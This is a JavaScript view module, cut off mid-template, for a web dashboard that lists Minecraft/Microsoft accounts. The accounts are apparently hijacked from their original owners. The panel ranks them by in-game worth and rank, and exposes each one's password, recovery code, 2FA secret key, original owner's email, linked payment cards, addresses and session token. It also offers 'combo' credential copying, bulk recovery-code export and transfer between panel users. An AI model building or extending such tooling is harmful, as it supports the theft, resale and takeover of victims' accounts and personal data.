// Accounts Manager View Module - 3D Cards & Tactical Intelligence
const AccountsView = {
  state: {
    page: 1,
    limit: 12,
    search: '',
    filter: 'all',
    sort: 'time_desc',
    scope: 'user',
    viewMode: localStorage.getItem('accounts_view_mode') || 'grid',
    metrics: { totalCount: 0, mcCount: 0, quarantineCount: 0, rankedCount: 0 }
  },

  async render() {
    const container = document.getElementById('view-content');
    container.innerHTML = `
      <!-- Intelligence Metrics Ribbon -->
      <div class="accounts-metrics-ribbon" id="accounts-metrics-container">
        <div class="metric-stat-card">
          <div class="metric-stat-icon amber">
            <re-icon icon="users" size="20" aria-hidden="true"></re-icon>
          </div>
          <div class="metric-stat-info">
            <span class="metric-stat-label">Secured Accounts</span>
            <span class="metric-stat-val" id="metric-total-val">—</span>
          </div>
        </div>

        <div class="metric-stat-card">
          <div class="metric-stat-icon green">
            <re-icon icon="three-d-cube" size="20" aria-hidden="true"></re-icon>
          </div>
          <div class="metric-stat-info">
            <span class="metric-stat-label">Minecraft Owners</span>
            <span class="metric-stat-val" id="metric-mc-val">—</span>
          </div>
        </div>

        <div class="metric-stat-card">
          <div class="metric-stat-icon blue">
            <re-icon icon="crown" size="20" aria-hidden="true"></re-icon>
          </div>
          <div class="metric-stat-info">
            <span class="metric-stat-label">Hypixel Ranked</span>
            <span class="metric-stat-val" id="metric-ranked-val">—</span>
          </div>
        </div>

        <div class="metric-stat-card">
          <div class="metric-stat-icon orange">
            <re-icon icon="shield-alert" size="20" aria-hidden="true"></re-icon>
          </div>
          <div class="metric-stat-info">
            <span class="metric-stat-label">Quarantine Vault</span>
            <span class="metric-stat-val" id="metric-quarantine-val">—</span>
          </div>
        </div>
      </div>

      <!-- Command Toolbar & View Controls -->
      <div class="accounts-toolbar">
        <div style="display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:14px;">
          <!-- Search Bar -->
          <div style="display:flex;flex-wrap:wrap;align-items:center;gap:10px;flex:1;max-width:540px;">
            <div style="position:relative;flex:1;min-width:240px;">
              <input type="text" id="acc-search-input" class="form-input" 
                     placeholder="Search username, email, UID, recovery code... (/)" 
                     value="${this.state.search}"
                     onkeydown="if(event.key==='Enter') AccountsView.onSearch()" />
            </div>
            <button class="btn btn-secondary" onclick="AccountsView.onSearch()" title="Search Accounts">
              <re-icon icon="search" size="14" aria-hidden="true"></re-icon>
            </button>
            ${this.state.search ? `
              <button class="btn btn-secondary btn-sm" onclick="AccountsView.clearSearch()" title="Clear Search">
                <re-icon icon="x" size="13" aria-hidden="true"></re-icon>
              </button>
            ` : ''}
          </div>

          <!-- Quick Action Buttons -->
          <div style="display:flex;flex-wrap:wrap;align-items:center;gap:8px;">
            <!-- View Mode Switcher -->
            <div class="btn-group" style="background:rgba(255,255,255,0.04);padding:3px;border-radius:var(--radius-sm);border:1px solid var(--border-color);">
              <button class="btn btn-sm ${this.state.viewMode === 'grid' ? 'btn-primary' : 'btn-secondary'}" 
                      style="padding:6px 12px;font-size:0.75rem;"
                      onclick="AccountsView.setViewMode('grid')" title="3D Cards Grid View">
                <re-icon icon="grid" size="14" aria-hidden="true"></re-icon> Cards
              </button>
              <button class="btn btn-sm ${this.state.viewMode === 'table' ? 'btn-primary' : 'btn-secondary'}" 
                      style="padding:6px 12px;font-size:0.75rem;"
                      onclick="AccountsView.setViewMode('table')" title="Compact Table View">
                <re-icon icon="list" size="14" aria-hidden="true"></re-icon> Table
              </button>
            </div>

            <button class="btn btn-primary btn-sm" onclick="AccountsView.openAddAccountModal()">
              <re-icon icon="plus" size="14" aria-hidden="true"></re-icon> Add Account
            </button>

            <!-- Export Dropdown -->
            <div class="dropdown" style="position:relative;display:inline-block;">
              <button class="btn btn-secondary btn-sm" onclick="AccountsView.toggleExportDropdown()">
                <re-icon icon="download" size="14" aria-hidden="true"></re-icon> Export <re-icon icon="chevron-down" size="11" aria-hidden="true"></re-icon>
              </button>
              <div id="export-dropdown-menu" style="display:none;position:absolute;right:0;top:100%;margin-top:6px;background:var(--bg-card);border:1px solid var(--border-card);border-radius:var(--radius-md);box-shadow:var(--shadow-lg);z-index:40;min-width:190px;overflow:hidden;">
                <a href="/api/accounts/export/download?format=txt&scope=${this.state.scope}" target="_blank" class="nav-item" style="margin:0;border-radius:0;padding:10px 14px;font-size:0.8rem;">
                  <re-icon icon="feed" size="14" style="color:var(--primary);" aria-hidden="true"></re-icon> Download TXT
                </a>
                <a href="/api/accounts/export/download?format=csv&scope=${this.state.scope}" target="_blank" class="nav-item" style="margin:0;border-radius:0;padding:10px 14px;font-size:0.8rem;">
                  <re-icon icon="feed" size="14" style="color:#38bdf8;" aria-hidden="true"></re-icon> Download CSV
                </a>
                <a href="/api/accounts/export/download?format=json&scope=${this.state.scope}" target="_blank" class="nav-item" style="margin:0;border-radius:0;padding:10px 14px;font-size:0.8rem;">
                  <re-icon icon="code-file" size="14" style="color:#34d399;" aria-hidden="true"></re-icon> Download JSON
                </a>
                <a href="/api/accounts/export/recovery-codes?scope=${this.state.scope}" target="_blank" class="nav-item" style="margin:0;border-radius:0;padding:10px 14px;font-size:0.8rem;border-top:1px solid var(--border-color);">
                  <re-icon icon="key" size="14" style="color:#fbbf24;" aria-hidden="true"></re-icon> Recovery Codes Only
                </a>
              </div>
            </div>

            <button class="btn btn-danger btn-sm" onclick="AccountsView.confirmDeleteAll()" title="Delete all user accounts">
              <re-icon icon="trash" size="14" aria-hidden="true"></re-icon>
            </button>
          </div>
        </div>

        <!-- Filter Chips & Sorting Row -->
        <div style="display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:12px;margin-top:14px;padding-top:14px;border-top:1px solid var(--border-color);">
          <div style="display:flex;gap:6px;flex-wrap:wrap;">
            <button class="btn btn-sm ${this.state.filter === 'all' ? 'btn-primary' : 'btn-secondary'}" onclick="AccountsView.setFilter('all')">All</button>
            <button class="btn btn-sm ${this.state.filter === 'mc' ? 'btn-primary' : 'btn-secondary'}" onclick="AccountsView.setFilter('mc')">
              <re-icon icon="three-d-cube" size="20" aria-hidden="true"></re-icon> Owns MC
            </button>
            <button class="btn btn-sm ${this.state.filter === 'capes' ? 'btn-primary' : 'btn-secondary'}" onclick="AccountsView.setFilter('capes')">
              <re-icon icon="shield" size="13" aria-hidden="true"></re-icon> Has Capes
            </button>
            <button class="btn btn-sm ${this.state.filter === 'nomc' ? 'btn-primary' : 'btn-secondary'}" onclick="AccountsView.setFilter('nomc')">No MC</button>
          </div>

          <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
            ${API.isAdmin ? `
              <label class="form-checkbox-label" style="font-size:0.8rem;padding:0;">
                <input type="checkbox" id="acc-scope-all" ${this.state.scope === 'all' ? 'checked' : ''} onchange="AccountsView.toggleScope(this.checked)" />
                <span>All Users' Accounts</span>
              </label>
            ` : ''}

            <div style="display:flex;align-items:center;gap:6px;">
              <span style="font-size:0.75rem;color:var(--text-dim);font-weight:600;text-transform:uppercase;">Sort:</span>
              <select class="form-select" style="width:auto;padding:6px 12px;font-size:0.78rem;" onchange="AccountsView.setSort(this.value)">
                <option value="time_desc" ${this.state.sort === 'time_desc' ? 'selected' : ''}>Newest First</option>
                <option value="networth" ${this.state.sort === 'networth' ? 'selected' : ''}>Highest Networth</option>
                <option value="rank" ${this.state.sort === 'rank' ? 'selected' : ''}>Hypixel Rank</option>
                <option value="bedwars_level" ${this.state.sort === 'bedwars_level' ? 'selected' : ''}>Bedwars Stars</option>
                <option value="skyblocklvl" ${this.state.sort === 'skyblocklvl' ? 'selected' : ''}>Skyblock Level</option>
                <option value="capes" ${this.state.sort === 'capes' ? 'selected' : ''}>Most Capes</option>
                <option value="time_asc" ${this.state.sort === 'time_asc' ? 'selected' : ''}>Oldest First</option>
                <option value="username_asc" ${this.state.sort === 'username_asc' ? 'selected' : ''}>Username A-Z</option>
                <option value="username_desc" ${this.state.sort === 'username_desc' ? 'selected' : ''}>Username Z-A</option>
              </select>
            </div>
          </div>
        </div>
      </div>

      <!-- Accounts Dynamic Viewport Container -->
      <div id="accounts-container">
        ${App.waveDots('Loading secured accounts...', 'lg')}
      </div>
    `;

    await this.loadAccounts();
  },

  async loadAccounts() {
    const container = document.getElementById('accounts-container');
    if (!container) return;

    try {
      const res = await API.get('/api/accounts', {
        page: this.state.page,
        limit: this.state.limit,
        search: this.state.search,
        filter: this.state.filter,
        sort: this.state.sort,
        scope: this.state.scope
      });

      const { accounts, pagination, metrics } = res.data;

      // Update metrics ribbon
      if (metrics) {
        const totalEl = document.getElementById('metric-total-val');
        const mcEl = document.getElementById('metric-mc-val');
        const quEl = document.getElementById('metric-quarantine-val');
        const rkEl = document.getElementById('metric-ranked-val');

        if (totalEl) totalEl.textContent = metrics.totalCount || 0;
        if (mcEl) {
          const pct = metrics.totalCount > 0 ? Math.round((metrics.mcCount / metrics.totalCount) * 100) : 0;
          mcEl.innerHTML = `${metrics.mcCount || 0} <span style="font-size:0.75rem;color:var(--text-dim);font-weight:400;">(${pct}%)</span>`;
        }
        if (quEl) quEl.textContent = metrics.quarantineCount || 0;
        
        // Count ranked accounts in current view
        const rankedInBatch = accounts.filter(a => a.rank && a.rank !== 'None').length;
        if (rkEl) rkEl.textContent = rankedInBatch;
      }

      if (!accounts.length) {
        container.innerHTML = `
          <div class="card" style="text-align:center;padding:60px 20px;">
            <re-icon icon="user" size="36" style="color:var(--text-dim);margin-bottom:16px;" aria-hidden="true"></re-icon>
            <h3 style="color:#fff;font-size:1.15rem;font-weight:600;">No accounts found</h3>
            <p style="font-size:0.85rem;color:var(--text-dim);margin-top:6px;max-width:400px;margin-left:auto;margin-right:auto;">
              ${this.state.search ? `No accounts matched "${this.state.search}". Try clearing your search query.` : 'There are no secured accounts in this category yet.'}
            </p>
            ${this.state.search ? `
              <div style="margin-top:16px;">
                <button class="btn btn-secondary btn-sm" onclick="AccountsView.clearSearch()">Clear Search</button>
              </div>
            ` : ''}
          </div>
        `;
        return;
      }

      // Render either 3D Grid or Table based on current viewMode
      if (this.state.viewMode === 'grid') {
        this.renderGrid(container, accounts, pagination);
      } else {
        this.renderTable(container, accounts, pagination);
      }

    } catch (err) {
      container.innerHTML = `
        <div class="card" style="text-align:center;padding:40px;color:var(--danger);">
          <re-icon icon="alert-triangle" size="24" style="margin-bottom:10px;" aria-hidden="true"></re-icon>
          <div>Error loading accounts: ${err.message}</div>
        </div>
      `;
    }
  },

  formatCoins(num) {
    if (!num || isNaN(num) || Number(num) === 0) return '0 Coins';
    const n = Number(num);
    if (n >= 1e9) return (n / 1e9).toFixed(2) + 'B Coins';
    if (n >= 1e6) return (n / 1e6).toFixed(1) + 'M Coins';
    if (n >= 1e3) return (n / 1e3).toFixed(1) + 'k Coins';
    return n.toLocaleString() + ' Coins';
  },

  // 3D Card Grid Renderer
  renderGrid(container, accounts, pagination) {
    const cardsHtml = accounts.map(acc => {
      const username = (acc.username && acc.username !== "Couldn't find!" && acc.username !== 'Unknown') ? acc.username : '';
      const skinUrl = username 
        ? `https://mc-heads.net/body/${encodeURIComponent(username)}/right` 
        : 'https://mc-heads.net/body/MHF_Steve/right';

      // Minecraft Status
      const ownsMc = acc.ownsmc && !acc.ownsmc.includes('Failed') && acc.ownsmc !== 'No MC';
      const mcBadge = ownsMc 
        ? `<span class="badge-tag success"><re-icon icon="check-circle" size="13" aria-hidden="true"></re-icon> ${acc.ownsmc}</span>`
        : `<span class="badge-tag danger"><re-icon icon="alert-circle" size="13" aria-hidden="true"></re-icon> ${acc.ownsmc || 'No MC'}</span>`;

      // Quarantine
      const quarantineBadge = acc.is_quarantined
        ? `<span class="badge-tag danger"><re-icon icon="shield-alert" size="20" aria-hidden="true"></re-icon> Quarantined</span>`
        : '';

      // Networth calculation & display
      let worthDisplay = '—';
      if (acc.networth > 0) {
        worthDisplay = this.formatCoins(acc.networth);
      } else if (ownsMc) {
        worthDisplay = '~$15 Base';
      } else {
        worthDisplay = 'Unranked';
      }

      // Hypixel Rank formatting
      const r = (acc.rank || 'None').toUpperCase();
      let rankHtml = '';
      if (r === 'MVP++') {
        rankHtml = `<span class="hypixel-rank-badge rank-mvp-plus-plus">[MVP<span class="plus">++</span>]</span>`;
      } else if (r === 'MVP+') {
        rankHtml = `<span class="hypixel-rank-badge rank-mvp-plus">[MVP<span class="plus">+</span>]</span>`;
      } else if (r === 'MVP') {
        rankHtml = `<span class="hypixel-rank-badge rank-mvp">[MVP]</span>`;
      } else if (r === 'VIP+') {
        rankHtml = `<span class="hypixel-rank-badge rank-vip-plus">[VIP<span class="plus">+</span>]</span>`;
      } else if (r === 'VIP') {
        rankHtml = `<span class="hypixel-rank-badge rank-vip">[VIP]</span>`;
      } else {
        rankHtml = `<span class="hypixel-rank-badge rank-none">[NON]</span>`;
      }

      // Capes Pill list
      const capesList = acc.capesList || [];
      const capeIcons = {
        'migrator': '<re-icon icon="shield" size="13" aria-hidden="true"></re-icon> Migrator',
        'vanilla': '<re-icon icon="box2" size="13" aria-hidden="true"></re-icon> Vanilla',
        'cherry': '<re-icon icon="heart" size="13" aria-hidden="true"></re-icon> Cherry',
        '15th': '<re-icon icon="star" size="13" aria-hidden="true"></re-icon> 15th Anniv',
        'tiktok': '<re-icon icon="video" size="13" aria-hidden="true"></re-icon> TikTok',
        'twitch': '<re-icon icon="play" size="13" aria-hidden="true"></re-icon> Twitch',
        'minecon': '<re-icon icon="trophy" size="13" aria-hidden="true"></re-icon> Minecon',
        'pan': '<re-icon icon="sun" size="13" aria-hidden="true"></re-icon> Pan',
        'common': '<re-icon icon="tag" size="13" aria-hidden="true"></re-icon> Common',
        'founder': '<re-icon icon="award" size="13" aria-hidden="true"></re-icon> Founder'
      };

      let capesHtml = '';
      if (capesList.length > 0) {
        capesHtml = capesList.map(cape => {
          const cLower = String(cape).toLowerCase();
          const matched = Object.keys(capeIcons).find(k => cLower.includes(k));
          const label = matched ? capeIcons[matched] : `<re-icon icon="tag" size="11" aria-hidden="true"></re-icon> ${cape}`;
          return `<span class="cape-pill">${label}</span>`;
        }).join('');
      } else {
        capesHtml = `<span class="cape-pill empty"><re-icon icon="ban" size="12" aria-hidden="true"></re-icon> No Capes</span>`;
      }

      const maskedRec = acc.recoverycode 
        ? `${acc.recoverycode.substring(0, 11)}•••••` 
        : 'Not recorded';

      return `
        <div class="account-card">
          <!-- Top Badges Overlay -->
          <div class="account-card-header">
            <div>${mcBadge}</div>
            <div style="display:flex;gap:4px;align-items:center;">
              ${quarantineBadge}
              <button class="btn btn-secondary btn-sm" style="font-size:0.7rem;padding:2px 7px;" 
                      title="Copy combo (ign:email:pass:rec)" 
                      onclick="AccountsView.copyFormatted('${acc.uid}', '${acc.username}', '${acc.ownsmc}', '${(acc.capesList || []).join(', ')}', '${acc.recoverycode}', '${acc.email}', '${acc.secemail}', '${acc.secretkey}', '${acc.password}')">
                <re-icon icon="copy" size="13" aria-hidden="true"></re-icon> Combo
              </button>
            </div>
          </div>

          <!-- 3D Skin Stage Viewport -->
          <div class="account-stage-3d" onclick="AccountsView.inspectAccount('${acc.uid}')" title="Click to inspect account details">
            <img class="account-skin-3d" 
                 src="${skinUrl}" 
                 alt="${acc.username || 'Minecraft Skin'}"
                 loading="lazy"
                 onerror="this.src='https://mc-heads.net/body/MHF_Steve/right'" />
            <div class="account-stage-pedestal"></div>
          </div>

          <!-- Content Details Directly Under 3D Skin -->
          <div class="account-card-body">
            <!-- Username & UID -->
            <div class="account-user-meta">
              <div class="account-username-title" title="${acc.username || 'Unknown'}">
                <span>${acc.username || 'Unclaimed'}</span>
                <button class="account-username-btn" title="Copy Username" onclick="event.stopPropagation();API.copyText('${acc.username}', 'Username')">
                  <re-icon icon="copy" size="13" aria-hidden="true"></re-icon>
                </button>
              </div>
              <span class="account-uid-tag">#${acc.uid}</span>
            </div>

            <!-- Worth & Ranks Row -->
            <div class="account-spec-strip">
              <div class="account-spec-chip" title="Account Networth">
                <span class="account-spec-label">Worth</span>
                <div class="account-spec-value worth-value">
                  <re-icon icon="coins" size="13" style="color:#f59e0b;" aria-hidden="true"></re-icon>
                  ${worthDisplay}
                </div>
              </div>

              <div class="account-spec-chip" title="Hypixel Network Rank">
                <span class="account-spec-label">Hypixel Rank</span>
                <div class="account-spec-value">
                  ${rankHtml}
                </div>
              </div>
            </div>

            <!-- Capes Showcase Row -->
            <div>
              <div style="font-size:0.68rem;color:var(--text-dim);text-transform:uppercase;font-weight:600;letter-spacing:0.04em;margin-bottom:5px;">
                Capes & Badges
              </div>
              <div class="account-capes-row">
                ${capesHtml}
              </div>
            </div>

            <!-- Quick Recovery Code Access -->
            <div class="account-cred-box">
              <div style="overflow:hidden;">
                <div style="font-size:0.65rem;color:var(--text-dim);text-transform:uppercase;">Recovery Code</div>
                <div class="cred-text" title="${acc.recoverycode || ''}">${maskedRec}</div>
              </div>
              <button class="cred-copy-btn" title="Copy 25-digit Recovery Code" onclick="event.stopPropagation();API.copyText('${acc.recoverycode}', 'Recovery Code')">
                <re-icon icon="copy" size="13" aria-hidden="true"></re-icon> Copy
              </button>
            </div>
          </div>

          <!-- Card Footer Actions -->
          <div class="account-card-footer">
            <button class="btn btn-secondary btn-sm" style="flex:1;" onclick="AccountsView.inspectAccount('${acc.uid}')">
              <re-icon icon="search" size="13" aria-hidden="true"></re-icon> Inspect
            </button>
            <button class="btn btn-secondary btn-sm" title="Transfer Account" onclick="AccountsView.openMoveModal('${acc.uid}')">
              <re-icon icon="arrow-right" size="13" aria-hidden="true"></re-icon>
            </button>
            <button class="btn btn-danger btn-sm" title="Delete Account" onclick="AccountsView.deleteAccount('${acc.uid}')">
              <re-icon icon="trash" size="14" aria-hidden="true"></re-icon>
            </button>
          </div>
        </div>
      `;
    }).join('');

    container.innerHTML = `
      <div class="accounts-grid">
        ${cardsHtml}
      </div>
      ${this.renderPaginationHtml(pagination)}
    `;
  },

  // Compact Table Renderer (Alternative view mode)
  renderTable(container, accounts, pagination) {
    container.innerHTML = `
      <div class="card" style="margin-bottom:20px;">
        <div class="card-body" style="padding:0;">
          <div class="table-wrapper" style="border:none;border-radius:0;">
            <table>
              <thead>
                <tr>
                  <th>Player (3D)</th>
                  <th>Worth</th>
                  <th>Rank</th>
                  <th>Capes</th>
                  <th>Recovery Code</th>
                  <th>Email</th>
                  <th style="text-align:right;">Actions</th>
                </tr>
              </thead>
              <tbody>
                ${accounts.map(acc => {
                  const r = (acc.rank || 'None').toUpperCase();
                  const worth = acc.networth > 0 ? OverviewView.formatCoins(acc.networth) : (acc.ownsmc === 'Purchased' ? '~$15 Base' : '—');
                  return `
                    <tr>
                      <td>
                        <div style="display:flex;align-items:center;gap:10px;">
                          <img src="https://mc-heads.net/avatar/${encodeURIComponent(acc.username || 'Steve')}/48" 
                               onerror="this.src='https://mc-heads.net/avatar/MHF_Steve/48'"
                               style="width:32px;height:32px;border-radius:6px;flex-shrink:0;border:1px solid rgba(255,255,255,0.1);" />
                          <div>
                            <div style="font-weight:600;display:flex;align-items:center;gap:6px;">
                              ${acc.username || 'Unknown'}
                              ${acc.is_quarantined ? '<span class="badge-tag danger"><re-icon icon="lock" size="12" aria-hidden="true"></re-icon></span>' : ''}
                            </div>
                            <div style="font-size:0.72rem;color:var(--text-dim);font-family:var(--font-mono);">#${acc.uid}</div>
                          </div>
                        </div>
                      </td>
                      <td style="font-family:var(--font-mono);color:#fbbf24;font-weight:600;">
                        ${worth}
                      </td>
                      <td>
                        <span class="badge-tag ${r !== 'NONE' ? 'warning' : 'info'}">${r}</span>
                      </td>
                      <td>
                        <span class="badge-tag ${acc.capesList && acc.capesList.length ? 'success' : 'info'}">
                          ${acc.capesList && acc.capesList.length ? acc.capesList.join(', ') : 'None'}
                        </span>
                      </td>
                      <td>
                        <button class="btn btn-secondary btn-sm" style="font-family:var(--font-mono);font-size:0.75rem;" 
                                onclick="API.copyText('${acc.recoverycode}', 'Recovery Code')">
                          <re-icon icon="copy" size="13" aria-hidden="true"></re-icon> ${acc.recoverycode ? acc.recoverycode.substring(0, 11) + '...' : 'N/A'}
                        </button>
                      </td>
                      <td style="font-family:var(--font-mono);font-size:0.8rem;color:var(--text-muted);">
                        ${acc.email}
                      </td>
                      <td style="text-align:right;">
                        <div class="btn-group" style="justify-content:flex-end;">
                          <button class="btn btn-secondary btn-sm" title="Inspect" onclick="AccountsView.inspectAccount('${acc.uid}')">
                            <re-icon icon="search" size="14" aria-hidden="true"></re-icon>
                          </button>
                          <button class="btn btn-secondary btn-sm" title="Copy Combo" onclick="AccountsView.copyFormatted('${acc.uid}', '${acc.username}', '${acc.ownsmc}', '${(acc.capesList || []).join(', ')}', '${acc.recoverycode}', '${acc.email}', '${acc.secemail}', '${acc.secretkey}', '${acc.password}')">
                            <re-icon icon="feed" size="13" aria-hidden="true"></re-icon>
                          </button>
                          <button class="btn btn-secondary btn-sm" title="Transfer" onclick="AccountsView.openMoveModal('${acc.uid}')">
                            <re-icon icon="arrow-right" size="13" aria-hidden="true"></re-icon>
                          </button>
                          <button class="btn btn-danger btn-sm" title="Delete" onclick="AccountsView.deleteAccount('${acc.uid}')">
                            <re-icon icon="trash" size="14" aria-hidden="true"></re-icon>
                          </button>
                        </div>
                      </td>
                    </tr>
                  `;
                }).join('')}
              </tbody>
            </table>
          </div>
          ${this.renderPaginationHtml(pagination)}
        </div>
      </div>
    `;
  },

  renderPaginationHtml(pagination) {
    if (!pagination) return '';
    return `
      <div style="padding:14px 20px;display:flex;align-items:center;justify-content:space-between;border-top:1px solid var(--border-color);background:rgba(0,0,0,0.18);border-radius:0 0 var(--radius-lg) var(--radius-lg);margin-top:10px;">
        <div style="font-size:0.8rem;color:var(--text-dim);">
          Showing page <b>${pagination.page}</b> of <b>${pagination.totalPages || 1}</b> (${pagination.total} total accounts)
        </div>
        <div style="display:flex;gap:8px;">
          <button class="btn btn-secondary btn-sm" ${pagination.page <= 1 ? 'disabled' : ''} onclick="AccountsView.setPage(${pagination.page - 1})">
            <re-icon icon="chevron-left" size="12" aria-hidden="true"></re-icon> Previous
          </button>
          <button class="btn btn-secondary btn-sm" ${pagination.page >= pagination.totalPages ? 'disabled' : ''} onclick="AccountsView.setPage(${pagination.page + 1})">
            Next <re-icon icon="chevron-right" size="12" aria-hidden="true"></re-icon>
          </button>
        </div>
      </div>
    `;
  },

  setViewMode(mode) {
    this.state.viewMode = mode;
    localStorage.setItem('accounts_view_mode', mode);
    this.render();
  },

  onSearch() {
    const input = document.getElementById('acc-search-input');
    this.state.search = input ? input.value.trim() : '';
    this.state.page = 1;
    this.loadAccounts();
  },

  clearSearch() {
    this.state.search = '';
    const input = document.getElementById('acc-search-input');
    if (input) input.value = '';
    this.state.page = 1;
    this.loadAccounts();
  },

  setFilter(filter) {
    this.state.filter = filter;
    this.state.page = 1;
    this.render();
  },

  setSort(sort) {
    this.state.sort = sort;
    this.state.page = 1;
    this.loadAccounts();
  },

  setPage(page) {
    this.state.page = page;
    this.loadAccounts();
    window.scrollTo({ top: 0, behavior: 'smooth' });
  },

  toggleScope(checked) {
    this.state.scope = checked ? 'all' : 'user';
    this.state.page = 1;
    this.loadAccounts();
  },

  toggleExportDropdown() {
    const el = document.getElementById('export-dropdown-menu');
    if (el) el.style.display = el.style.display === 'none' ? 'block' : 'none';
  },

  copyFormatted(uid, ign, mc, capes, rec, email, sec, key, pass) {
    const str = `${ign}:${mc}:${capes}:${rec}:${email}:${sec}:${key}:${pass}`;
    API.copyText(str, 'Credentials');
  },

  async inspectAccount(uid) {
    try {
      const res = await API.get(`/api/accounts/${uid}`);
      const acc = res.data;

      const bodyHtml = `
        <!-- Account Overview Card -->
        <div style="display:flex;align-items:center;gap:18px;margin-bottom:20px;padding:16px;background:rgba(255,255,255,0.02);border-radius:var(--radius-lg);border:1px solid var(--border-color);">
          <img src="https://mc-heads.net/body/${encodeURIComponent(acc.username || 'Steve')}/right" 
               onerror="this.src='https://mc-heads.net/body/MHF_Steve/right'"
               style="height:110px;object-fit:contain;filter:drop-shadow(0 6px 12px rgba(0,0,0,0.6));" />
          <div style="flex:1;">
            <div style="display:flex;align-items:center;justify-content:space-between;">
              <h3 style="font-size:1.3rem;font-weight:700;color:#fff;">${acc.username || 'Unknown'}</h3>
              <span class="account-uid-tag">#${acc.uid}</span>
            </div>
            <div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap;">
              <span class="badge-tag ${acc.ownsmc && !acc.ownsmc.includes('Failed') ? 'success' : 'danger'}">${acc.ownsmc || 'None'}</span>
              <span class="badge-tag warning">${acc.capes || 'No Capes'}</span>
              ${acc.quarantine ? '<span class="badge-tag danger"><re-icon icon="lock" size="12" aria-hidden="true"></re-icon> Quarantined</span>' : ''}
            </div>
            <div style="font-size:0.78rem;color:var(--text-dim);margin-top:8px;">
              Added: <b>${acc.time ? new Date(parseInt(acc.time, 10) * 1000).toLocaleString() : 'N/A'}</b>
            </div>
          </div>
        </div>

        <!-- Detail Tabs -->
        <div class="tabs-header" style="padding:0;margin-bottom:16px;">
          <button class="tab-btn active" id="modal-tab-btn-creds" onclick="AccountsView.switchModalTab('creds')">Credentials</button>
          <button class="tab-btn" id="modal-tab-btn-extra" onclick="AccountsView.switchModalTab('extra')">Extra Information</button>
          <button class="tab-btn" id="modal-tab-btn-stats" onclick="AccountsView.switchModalTab('stats')">Hypixel Stats</button>
        </div>

        <!-- Tab 1: Credentials -->
        <div id="modal-tab-content-creds">
          <div style="display:grid;grid-template-columns:1fr;gap:12px;">
            <div class="form-group" style="margin-bottom:0;">
              <label class="form-label">Email Address</label>
              <div style="display:flex;gap:8px;">
                <input type="text" class="form-input" style="font-family:var(--font-mono);" readonly value="${acc.email}" />
                <button class="btn btn-secondary btn-sm" onclick="API.copyText('${acc.email}', 'Email')"><re-icon icon="copy" size="13" aria-hidden="true"></re-icon></button>
              </div>
            </div>

            <div class="form-group" style="margin-bottom:0;">
              <label class="form-label">Password</label>
              <div style="display:flex;gap:8px;">
                <input type="text" class="form-input" style="font-family:var(--font-mono);" readonly value="${acc.password || ''}" />
                <button class="btn btn-secondary btn-sm" onclick="API.copyText('${acc.password}', 'Password')"><re-icon icon="copy" size="13" aria-hidden="true"></re-icon></button>
              </div>
            </div>

            <div class="form-group" style="margin-bottom:0;">
              <label class="form-label">25-Digit Recovery Code</label>
              <div style="display:flex;gap:8px;">
                <input type="text" class="form-input" style="font-family:var(--font-mono);color:#34d399;font-weight:600;" readonly value="${acc.recoverycode || ''}" />
                <button class="btn btn-secondary btn-sm" onclick="API.copyText('${acc.recoverycode}', 'Recovery Code')"><re-icon icon="copy" size="13" aria-hidden="true"></re-icon></button>
              </div>
            </div>

            <div class="form-group" style="margin-bottom:0;">
              <label class="form-label">Secondary / Rescue Email</label>
              <div style="display:flex;gap:8px;">
                <input type="text" class="form-input" style="font-family:var(--font-mono);" readonly value="${acc.secemail || 'None'}" />
                <button class="btn btn-secondary btn-sm" onclick="API.copyText('${acc.secemail}', 'Secondary Email')"><re-icon icon="copy" size="13" aria-hidden="true"></re-icon></button>
              </div>
            </div>

            <div class="form-group" style="margin-bottom:0;">
              <label class="form-label">Secret Key (2FA TOTP)</label>
              <div style="display:flex;gap:8px;">
                <input type="text" class="form-input" style="font-family:var(--font-mono);" readonly value="${acc.secretkey || 'Disabled'}" />
                <button class="btn btn-secondary btn-sm" onclick="API.copyText('${acc.secretkey}', 'Secret Key')"><re-icon icon="copy" size="13" aria-hidden="true"></re-icon></button>
              </div>
            </div>
          </div>
        </div>

        <!-- Tab 2: Extra Information -->
        <div id="modal-tab-content-extra" style="display:none;">
          ${acc.extra ? `
            <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(200px, 1fr));gap:12px;font-size:0.85rem;">
              <div style="padding:10px;background:var(--bg-input);border-radius:var(--radius-sm);border:1px solid var(--border-color);">
                <div style="color:var(--text-dim);font-size:0.75rem;">Original Email (OGO)</div>
                <div style="font-weight:600;font-family:var(--font-mono);margin-top:2px;">${acc.extra.ogo || 'N/A'}</div>
              </div>
              <div style="padding:10px;background:var(--bg-input);border-radius:var(--radius-sm);border:1px solid var(--border-color);">
                <div style="color:var(--text-dim);font-size:0.75rem;">Xbox Gamertag</div>
                <div style="font-weight:600;margin-top:2px;">${acc.extra.newgamertag || acc.extra.gtg || 'N/A'}</div>
              </div>
              <div style="padding:10px;background:var(--bg-input);border-radius:var(--radius-sm);border:1px solid var(--border-color);">
                <div style="color:var(--text-dim);font-size:0.75rem;">Linked Cards</div>
                <div style="font-weight:600;margin-top:2px;">${acc.extra.cards || 'None'}</div>
              </div>
              <div style="padding:10px;background:var(--bg-input);border-radius:var(--radius-sm);border:1px solid var(--border-color);">
                <div style="color:var(--text-dim);font-size:0.75rem;">Subscriptions</div>
                <div style="font-weight:600;margin-top:2px;">${acc.extra.subscriptions || 'None'}</div>
              </div>
              <div style="padding:10px;background:var(--bg-input);border-radius:var(--radius-sm);border:1px solid var(--border-color);">
                <div style="color:var(--text-dim);font-size:0.75rem;">Addresses</div>
                <div style="font-weight:600;margin-top:2px;">${acc.extra.addresses || 'None'}</div>
              </div>
              <div style="padding:10px;background:var(--bg-input);border-radius:var(--radius-sm);border:1px solid var(--border-color);">
                <div style="color:var(--text-dim);font-size:0.75rem;">Devices</div>
                <div style="font-weight:600;margin-top:2px;">${acc.extra.devices || 'None'}</div>
              </div>
              <div style="padding:10px;background:var(--bg-input);border-radius:var(--radius-sm);border:1px solid var(--border-color);">
                <div style="color:var(--text-dim);font-size:0.75rem;">Creation Date</div>
                <div style="font-weight:600;margin-top:2px;">${acc.extra.creationdate || 'N/A'}</div>
              </div>
              <div style="padding:10px;background:var(--bg-input);border-radius:var(--radius-sm);border:1px solid var(--border-color);">
                <div style="color:var(--text-dim);font-size:0.75rem;">SSID Token</div>
